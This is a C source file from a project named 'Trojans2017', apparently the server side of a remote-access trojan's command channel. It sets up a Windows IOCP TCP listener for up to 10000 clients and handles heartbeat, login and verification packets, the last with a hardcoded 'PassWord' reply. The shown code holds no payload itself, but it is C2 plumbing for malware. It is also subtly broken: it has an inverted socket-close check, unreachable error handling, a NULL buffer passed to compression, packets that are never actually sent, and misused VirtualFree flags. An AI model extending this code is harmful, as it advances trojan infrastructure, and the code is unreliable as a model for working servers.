#include "Trojans2017.h"
#include "ClientInformation.h"
#include "MyCompress.h"
#include "NetIoCompletionPort.h"

IO_COMPLETION_PORT_INFORMATION g_IoCompletionPortInformation;
CLIENT_INFORMATION g_ClientInformation;

void RemoveStaleClient(PCLIENT_CONTEXT pClient,BOOLEAN bGraceful)
{
    LINGER Linger;

    if (FALSE == bGraceful)
    {
        Linger.l_onoff = 1;
        Linger.l_linger = 0;
        setsockopt(pClient->Socket,SOL_SOCKET,SO_LINGER,(char *)&Linger,sizeof(Linger));
    }
    if (FindClient(pClient))
    {
        if (INVALID_SOCKET == pClient->Socket)
        {
            CancelIo((HANDLE)pClient->Socket);
            closesocket(pClient->Socket);
            pClient->Socket = INVALID_SOCKET;
        }
        while (!HasOverlappedIoCompleted((LPOVERLAPPED)pClient))
        {
            Sleep(0);
        }
        NotifyProc(&g_IoCompletionPortInformation,pClient,NC_CLIENT_DISCONNECT);
        //Clear Buffer
    }
}
BOOLEAN OnClientInitialize(PCLIENT_CONTEXT pClientContext,ULONG ulIoSize)
{
    return TRUE;
}
BOOLEAN OnClientRead(PCLIENT_CONTEXT pClientContext,ULONG ulIoSize)
{
    return TRUE;
}
BOOLEAN OnClientWrite(PCLIENT_CONTEXT pClientContext,ULONG ulIoSize)
{
    return TRUE;
}
unsigned ThreadPoolFunc(PVOID pContext)
{
    BOOLEAN bIoRet,bError;
    ULONG ulIoSize;
    ULONG ulIoError,ulBusyThreads;
    LPOVERLAPPED pOverLapped;
    PCLIENT_CONTEXT pClientContext;
    POVERLAPPEDPLUS pOverLappedPlus;
    PIO_COMPLETION_PORT_INFORMATION pIoCompletionPortInfor;

    bError = FALSE;
    pIoCompletionPortInfor = (PIO_COMPLETION_PORT_INFORMATION)pContext;
    InterlockedIncrement(&pIoCompletionPortInfor->lCurrentThreads);
    InterlockedIncrement(&pIoCompletionPortInfor->lBusyThreads);

    while (TRUE)
    {
        InterlockedDecrement(&pIoCompletionPortInfor->lBusyThreads);
        bIoRet = GetQueuedCompletionStatus(g_IoCompletionPortInformation.hCompletionPort, \
            &ulIoSize, \
            (PULONG_PTR)&pClientContext, \
            &pOverLapped, \
            INFINITE);
        ulIoError = GetLastError();
        pOverLappedPlus = CONTAINING_RECORD(pOverLapped,OVERLAPPEDPLUS,OverLapped);
        ulBusyThreads = InterlockedIncrement(&pIoCompletionPortInfor->lBusyThreads);
        if (!bIoRet && ulIoError != WAIT_TIMEOUT)
        {
            if (pClientContext && pIoCompletionPortInfor->bOffline == FALSE)
            {
                //Remove
                //RemoveStaleClient(pClientContext,FALSE);
                OutputDebugString(L"RemoveStaleClient\r\n");
            }
            continue;
            bError = TRUE;
        }
        if (!bError)
        {
            if(bIoRet && NULL != pOverLappedPlus && NULL != pClientContext) 
            {
                switch (pOverLappedPlus->IoType)
                {
                case IoInitialize:
                    OnClientInitialize(pClientContext,ulIoSize);
                    break;
                case IoRead:
                    OnClientRead(pClientContext,ulIoSize);
                    break;
                case IoWrite:
                    OnClientWrite(pClientContext,ulIoSize);
                    break;
                default:
                    break;
                }
            }
        }
        if (pOverLappedPlus)
        {
            VirtualFree(pOverLappedPlus,sizeof(OVERLAPPEDPLUS),MEM_DECOMMIT | MEM_RESERVE);
        }
    }
    InterlockedDecrement(&pIoCompletionPortInfor->ulWorkCount);
    InterlockedDecrement(&pIoCompletionPortInfor->lCurrentThreads);
    InterlockedDecrement(&pIoCompletionPortInfor->lBusyThreads);
}
void PostRecv(PCLIENT_CONTEXT pContext)
{ 
    POVERLAPPEDPLUS pOverlapped;
    ULONG ulNumberOfBytesRecv;
    ULONG ulRetVal;
    ULONG ulFlags;

    do 
    {
        ulFlags = MSG_PARTIAL;
        pOverlapped = VirtualAlloc(NULL, \
            sizeof(OVERLAPPEDPLUS), \
            MEM_COMMIT | MEM_RESERVE, \
            PAGE_READWRITE);
    } while (NULL == pOverlapped);
    RtlZeroMemory(pOverlapped,sizeof(OVERLAPPEDPLUS));
    pOverlapped->IoType = IoRead;
    ulRetVal = WSARecv(pContext->Socket, \
        &pContext->WsaInBuffer, \
        1, \
        &ulNumberOfBytesRecv, \
        &ulFlags, \
        &pOverlapped->OverLapped, \
        NULL);
    if (ulRetVal == SOCKET_ERROR && WSAGetLastError() != WSA_IO_PENDING)
    {
        //Remove Client From List
        //RemoveStaleClient(pContext,FALSE);
        OutputDebugString(L"RemoveStaleClient\r\n");
    }
}
void ProcessReceiveComplete(PCLIENT_CONTEXT pClientContext)
{
    switch (pClientContext->pDeCompressionBuffer[0])
    {
    case PackVerification:
        SendDatToClient(pClientContext,"PassWord",strlen("PassWord"),PackVerification,UnionCompress);
        break;
    case PackHeart:
        SendDatToClient(pClientContext,NULL,0,PackHeart,UnionCompress);
        break;
    case PackLogin:
        pClientContext->bIsMainSocket = TRUE;
        break;
    default:
        break;
    }
    return;
}
void CALLBACK NotifyProc(PVOID pParam,PCLIENT_CONTEXT pClientContext,ULONG ulCode)
{
    switch (ulCode)
    {
    case NC_CLIENT_CONNECT:
        break;
    case NC_CLIENT_DISCONNECT:
        break;
    case NC_TRANSMIT:
        break;
    case NC_RECEIVE:
        break;
    case NC_RECEIVE_COMPLETE:
        ProcessReceiveComplete(pClientContext);
        break;
    }
}
void OnAccept()
{
    SOCKADDR_IN SockAddr;
    SOCKET ClientSocket;
    ULONG ulLen,ulRet;
    PCLIENT_CONTEXT pClientContext;
    struct tcp_keepalive TcpKeepLive;
    POVERLAPPEDPLUS pOverlapped;
    BOOLEAN bSuccess;
    ULONG ulOpt;
    CHAR ChoptA;

    if (g_IoCompletionPortInformation.bDisconnectAll)
    {
        return;
    }
    pClientContext = NULL;
    ulLen = sizeof(SOCKADDR_IN);
    ClientSocket = accept(g_IoCompletionPortInformation.ListenSocket, \
        (LPSOCKADDR)&SockAddr,&ulLen);
    if (SOCKET_ERROR == ClientSocket)
    {
        ulRet = WSAGetLastError();
        if (ulRet != WSAEWOULDBLOCK)
        {
            return;
        }
    }
    do 
    {
        pClientContext = VirtualAlloc(NULL, \
            sizeof(CLIENT_CONTEXT), \
            MEM_RESERVE | MEM_COMMIT, \
            PAGE_READWRITE);
    } while (NULL == pClientContext);
    RtlZeroMemory(pClientContext,sizeof(CLIENT_CONTEXT));

    pClientContext->Socket = ClientSocket;
    pClientContext->hWriteComplete = CreateEvent(NULL,FALSE,TRUE,NULL);
    pClientContext->WsaInBuffer.buf = (PCHAR)pClientContext->InBufferA;
    pClientContext->WsaInBuffer.len = sizeof(pClientContext->InBufferA);
    if (NULL == CreateIoCompletionPort((HANDLE)ClientSocket, \
        g_IoCompletionPortInformation.hCompletionPort, \
        (ULONG_PTR)pClientContext, \
        0))
    {
        VirtualFree(pClientContext,sizeof(CLIENT_CONTEXT),MEM_RESERVE | MEM_DECOMMIT);
        pClientContext = NULL;
        closesocket(ClientSocket);
        closesocket(g_IoCompletionPortInformation.ListenSocket);
        return;
    }
    ChoptA = 1;
    if (setsockopt(pClientContext->Socket,SOL_SOCKET,SO_KEEPALIVE,(char *)&ChoptA,sizeof(ChoptA)) != 0)
    {
        
    }
    TcpKeepLive.onoff = 1;
    TcpKeepLive.keepalivetime = g_IoCompletionPortInformation.ulKeepLiveTime;
    TcpKeepLive.keepaliveinterval = 1000 * 10;
    WSAIoctl(pClientContext->Socket, \
        SIO_KEEPALIVE_VALS, \
        &TcpKeepLive, \
        sizeof(struct tcp_keepalive), \
        NULL, \
        0, \
        &ulOpt, \
        0, \
        NULL);
    //Add pClientContext to List
    //AddTail(pClientContext);
    OutputDebugString(L"Add Client\r\n");
    do 
    {
        pOverlapped = VirtualAlloc(NULL, \
            sizeof(OVERLAPPEDPLUS), \
            MEM_COMMIT | MEM_RESERVE, \
            PAGE_READWRITE);
    } while (NULL == pOverlapped);
    RtlZeroMemory(pOverlapped,sizeof(OVERLAPPEDPLUS));
    pOverlapped->IoType = IoInitialize;
    bSuccess = PostQueuedCompletionStatus(g_IoCompletionPortInformation.hCompletionPort, \
        0, \
        (ULONG)pClientContext, \
        &pOverlapped->OverLapped);
    if (FALSE == bSuccess && GetLastError() != ERROR_IO_PENDING)
    {
        //Remove pClientContext from List
        //RemoveStaleClient(pClientContext,TRUE);
        OutputDebugString(L"RemoveStaleClient\r\n");
        return;
    }
    NotifyProc(&g_IoCompletionPortInformation,pClientContext,NC_CLIENT_CONNECT);
    PostRecv(pClientContext);
}
unsigned __stdcall ListenThreadFunc(PVOID pArguments)
{
    ULONG ulRet;
    WSANETWORKEVENTS WsaNetWorkEvents;
    PIO_COMPLETION_PORT_INFORMATION pIoCompletionPortInfo;

    pIoCompletionPortInfo = (PIO_COMPLETION_PORT_INFORMATION)pArguments;

    while (TRUE)
    {
        if (WaitForSingleObject(pIoCompletionPortInfo->hStopEvent,100) == WAIT_OBJECT_0)
        {
            break;
        }
        ulRet = WSAWaitForMultipleEvents(1,pIoCompletionPortInfo->WsaEvent,FALSE,100,FALSE);
        if (WSA_WAIT_TIMEOUT == ulRet)
        {
            continue;
        }
        ulRet = WSAEnumNetworkEvents(g_IoCompletionPortInformation.ListenSocket, \
            g_IoCompletionPortInformation.WsaEvent,&WsaNetWorkEvents);
        if (SOCKET_ERROR == ulRet)
        {
            break;
        }
        if (WsaNetWorkEvents.lNetworkEvents & FD_ACCEPT)
        {
            if (WsaNetWorkEvents.iErrorCode[FD_ACCEPT_BIT] == 0)
            {
                OnAccept();
            }
            else
            {
                break;
            }
        }
    }
    _endthreadex(0);
    return 0;
}
BOOLEAN InitializeIoCompletionPort()
{
    SOCKET Socket;
    ULONG ulThreadId,uli;
    SYSTEM_INFO SystemInfo;
    BOOLEAN bRet;
    ULONG ulWorkerCnt;
    HANDLE hWorker;

    do 
    {
        bRet = FALSE;
        Socket = socket(AF_INET,SOCK_STREAM,IPPROTO_IP);
        if (INVALID_SOCKET == Socket)
        {
            break;
        }
        g_IoCompletionPortInformation.hCompletionPort = \
            CreateIoCompletionPort((HANDLE)Socket,NULL,0,0);
        if (NULL == g_IoCompletionPortInformation.hCompletionPort)
        {
            closesocket(Socket);
            break;
        }
        closesocket(Socket);
        GetSystemInfo(&SystemInfo);
        ulWorkerCnt = SystemInfo.dwNumberOfProcessors * 2;
#ifndef _DEBUG
        for (uli = 0;uli < ulWorkerCnt;uli++)
#else
        for (uli = 0;uli < 1;uli++)
#endif
        {
            hWorker = (HANDLE)_beginthreadex(NULL,0,ThreadPoolFunc,&g_IoCompletionPortInformation,0,&ulThreadId);
            if (NULL == hWorker)
            {
                CloseHandle(hWorker);
                break;
            }
            g_IoCompletionPortInformation.ulWorkCount++;
            CloseHandle(hWorker);
            bRet = TRUE;
        }
    } while (0);
    return bRet;
}
BOOLEAN InitializeGlobalDat()
{
    WSADATA WsaData;
    BOOLEAN bRet;
    HANDLE hThread;
    ULONG ulThreadId;

    do 
    {
        bRet = FALSE;
        WSAStartup(MAKEWORD(2,2),&WsaData);
        RtlZeroMemory(&g_IoCompletionPortInformation,sizeof(IO_COMPLETION_PORT_INFORMATION));
        RtlCopyMemory(g_IoCompletionPortInformation.PacketName,PACKET_NAME,strlen(PACKET_NAME));
        g_IoCompletionPortInformation.hStopEvent =  CreateEvent(NULL,TRUE,FALSE,NULL);
        if (NULL == g_IoCompletionPortInformation.hStopEvent)
        {
            break;
        }
        g_IoCompletionPortInformation.ulMaxConnections = 10000;
        g_IoCompletionPortInformation.ulKeepLiveTime = 1000 * 60;
        InitializeCriticalSection(&g_IoCompletionPortInformation.CriticalSection);

        g_IoCompletionPortInformation.ListenSocket = WSASocket(AF_INET,SOCK_STREAM,0,NULL,0,WSA_FLAG_OVERLAPPED);
        if (INVALID_SOCKET == g_IoCompletionPortInformation.ListenSocket)
        {
            break;
        }
        g_IoCompletionPortInformation.WsaEvent = WSACreateEvent();
        if (WSA_INVALID_EVENT == g_IoCompletionPortInformation.WsaEvent)
        {
            closesocket(g_IoCompletionPortInformation.ListenSocket);
            break;
        }
        if (WSAEventSelect(g_IoCompletionPortInformation.ListenSocket, \
            g_IoCompletionPortInformation.WsaEvent,FD_ACCEPT) == SOCKET_ERROR)
        {
            closesocket(g_IoCompletionPortInformation.ListenSocket);
            break;
        }
        g_IoCompletionPortInformation.ScokAddrServer.sin_port = htons(DEFAULT_PORT);
        g_IoCompletionPortInformation.ScokAddrServer.sin_family = AF_INET;
        g_IoCompletionPortInformation.ScokAddrServer.sin_addr.s_addr = INADDR_ANY;

        if (bind(g_IoCompletionPortInformation.ListenSocket, \
            (LPSOCKADDR)&g_IoCompletionPortInformation.ScokAddrServer, \
            sizeof(struct sockaddr)) == SOCKET_ERROR)
        {
            closesocket(g_IoCompletionPortInformation.ListenSocket);
            break;
        }
        if (listen(g_IoCompletionPortInformation.ListenSocket,SOMAXCONN) == SOCKET_ERROR)
        {
            closesocket(g_IoCompletionPortInformation.ListenSocket);
            break;
        }
        hThread = (HANDLE)_beginthreadex(NULL,0,ListenThreadFunc,&g_IoCompletionPortInformation,0,&ulThreadId);
        if (INVALID_HANDLE_VALUE == hThread)
        {
            closesocket(g_IoCompletionPortInformation.ListenSocket);
            break;
        }
        bRet = TRUE;
        g_IoCompletionPortInformation.bInitialize = TRUE;
    } while (0);

    return bRet;
}
BOOLEAN SendDatToClient(PCLIENT_CONTEXT pClientContext,PCHAR pSendDat,ULONG ulSendSize,COMMAND_CODE CmdCode,COMPRESSROUTINE CompressRoutine)
{
    BOOLEAN bRet;
    PCHAR pDestDat;
    PCHAR pTotalDat;
    ULONG ulDestLength;
    ULONG ulTotalLength;
    PCOMMAND_PACKET pPacketCmd;
    POVERLAPPEDPLUS pOverlappedPlus;

    bRet = FALSE;
    pDestDat = NULL;
    ulDestLength = 0;
    ulTotalLength = 0;
    pTotalDat = NULL;
    pPacketCmd = NULL;
    pOverlappedPlus = NULL;

    do 
    {
        if (NULL == pSendDat && 0 == ulSendSize)
        {
            ulTotalLength = sizeof(COMMAND_PACKET);
        }
        else
        {
            bRet = CompressRoutine(pDestDat,&ulDestLength,pSendDat,ulSendSize,ZlibCompress);
            if (FALSE == bRet)
            {
                break;
            }
            ulTotalLength = sizeof(COMMAND_PACKET) + ulDestLength;
        }
        do 
        {
            pTotalDat = VirtualAlloc(NULL,ulTotalLength,MEM_RESERVE | MEM_COMMIT,PAGE_READWRITE);
        } while (NULL == pTotalDat);
        RtlZeroMemory(pTotalDat,ulTotalLength);
        pPacketCmd = (PCOMMAND_PACKET)pTotalDat;
        RtlCopyMemory(pPacketCmd->PacketHead,PACKET_NAME,PACKET_NAME_LENGTH);
        pPacketCmd->ulPackSize = ulTotalLength;
        pPacketCmd->ulPackCmdCode = CmdCode;
        RtlCopyMemory((PCHAR)((ULONG_PTR)pTotalDat + sizeof(COMMAND_PACKET)),pDestDat,ulDestLength);
        WaitForSingleObject(pClientContext->hWriteComplete,INFINITE);
        do 
        {
            pOverlappedPlus = VirtualAlloc(NULL, \
                sizeof(OVERLAPPEDPLUS), \
                MEM_COMMIT | MEM_RESERVE, \
                PAGE_READWRITE);
        } while (NULL == pOverlappedPlus);
        RtlZeroMemory(pOverlappedPlus,sizeof(OVERLAPPEDPLUS));
        pOverlappedPlus->IoType = IoWrite;
        PostQueuedCompletionStatus(g_IoCompletionPortInformation.hCompletionPort, \
            0, \
            (ULONG_PTR)pClientContext, \
            &pOverlappedPlus->OverLapped);
        bRet = TRUE;
    } while (0);
    if (pDestDat)
    {
        VirtualFree(pDestDat,ulDestLength,MEM_RESERVE | MEM_DECOMMIT);
    }
    if (FALSE == bRet)
    {

    }
    return bRet;
}